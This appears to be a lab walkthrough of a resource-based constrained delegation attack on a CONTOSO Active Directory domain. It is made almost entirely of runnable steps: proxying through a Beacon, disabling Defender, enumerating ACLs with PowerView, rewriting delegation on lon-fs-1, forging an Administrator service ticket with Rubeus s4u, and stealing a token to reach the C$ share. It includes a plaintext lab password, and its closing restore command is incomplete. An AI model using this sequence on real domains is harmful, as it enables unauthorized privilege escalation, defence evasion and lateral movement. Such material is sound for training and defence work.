# Attack

1. Start a SOCKS proxy on the medium-integrity Beacon.
   1. socks 1080
2. From the Windows Start Menu, launch Proxifier.
3. Go **Profile > Proxy Servers** and add a new proxy server.
   1. Address: 10.0.0.5
   2. Port: 1080
   3. Protocol: Version 4
4. Use this proxy by default? -> No.
5. Edit Proxification Rules now? -> Yes.
6. Add a new proxification rule.
   1. Name: Beacon
   2. Applications: Any
   3. Target hosts: 10.10.120.0/23
   4. Target ports: Any
   5. Action: Proxy SOCKS4 10.0.0.5
7. Open a Terminal window as administrator.
8. Add a host entry for _lon-dc-1_.
   1. Add-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Value '10.10.120.1 lon-dc-1'
9. Disable Defender's real-time protection.
   1. Set-MpPreference -DisableRealtimeMonitoring $true
10. Import PowerView.
    1. ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
11. Create a new plaintext credential object.

    1. $Cred = Get-Credential CONTOSO\rsteel

    > The password is Passw0rd!.
12. Find principals that have WriteProperty privileges on the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of computers.

    ```powershell
    Get-DomainComputer -Server 'lon-dc-1' -Credential $Cred | Get-DomainObjectAcl -Server 'lon-dc-1' -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
    ```
13. Resolve the SID to a domain group.

    ```powershell
    Get-ADGroup -Filter 'objectsid -eq "S-1-5-21-3926355307-1661546229-813047887-1107"' -Server 'lon-dc-1' -Credential $Cred
    ```
14. Check for any existing RBCD configurations.

    ```powershell
    Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
    ```
15. Add RBCD between _lon-fs-1_ and _lon-wkstn-1_, making sure not to overwrite the existing entry.

    ```powershell
    $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1' -Credential $Cred
    $wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1' -Credential $Cred
    Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1' -Credential $Cred
    ```
16. Verify that _lon-wkstn-1_ was added.

    ```powershell
    Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
    ```
17. In the high-integrity Beacon, obtain a TGT for _lon-wkstn-1_.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
    ```
18. Request a usable service ticket for _cifs/lon-fs-1_, impersonating the default domain administrator.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /nowrap
    ```
19. Inject the ticket into a sacrificial logon session.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[CIFS TICKET]
    ```
20. Impersonate the process.
    1. steal\_token \[PID]
21. Verify the ticket was injected.
    1. run klist
22. Use the ticket to list C$ on lon-fs-1.
    1. ls \\\lon-fs-1\c$
23. On the Atacker Desktop, restore the RBCD configuration back to how it was.

    ```powershell
    Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount 
    ```
